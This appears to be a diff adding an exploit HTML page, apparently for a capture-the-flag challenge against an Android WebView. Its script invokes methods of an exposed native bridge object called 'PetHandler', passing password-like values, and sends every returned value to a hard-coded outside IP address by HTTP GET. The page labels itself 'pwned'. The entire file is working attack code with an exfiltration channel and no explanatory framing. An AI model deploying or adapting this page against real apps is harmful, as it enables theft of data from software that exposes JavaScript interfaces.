@@ -1,0 +1,26 @@
+<html>
+<head>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+</head>
+<p> pwned ;) </p>
+
+<script>
+var pwnURL = "http://18.206.31.34/";
+var PetHandlerJS = window.PetHandler;
+// var getMySomething = PetHandlerJS.getMySomething;
+// var censorMyCats = PetHandlerJS.censorMyCats;
+// var censorMyDogs = PetHandlerJS.censorMyDogs;
+
+var str1 = PetHandlerJS.toString();
+var str2_1 = PetHandlerJS.getMySomething();
+var str2_2 = PetHandlerJS.getMySomething();
+var str3 = PetHandlerJS.censorMyCats([102, 112, 97, 115, 115, 119, 100, 49, 50, 51]);
+var str4 = PetHandlerJS.censorMyDogs(1337, "fpasswd123");
+
+$.get(pwnURL + "?str1=" + str1);
+$.get(pwnURL + "?str2_1=" + str2_1);
+$.get(pwnURL + "?str2_2=" + str2_2);
+$.get(pwnURL + "?str3=" + str3);
+$.get(pwnURL + "?str4=" + str4);
+</script>
+</html>
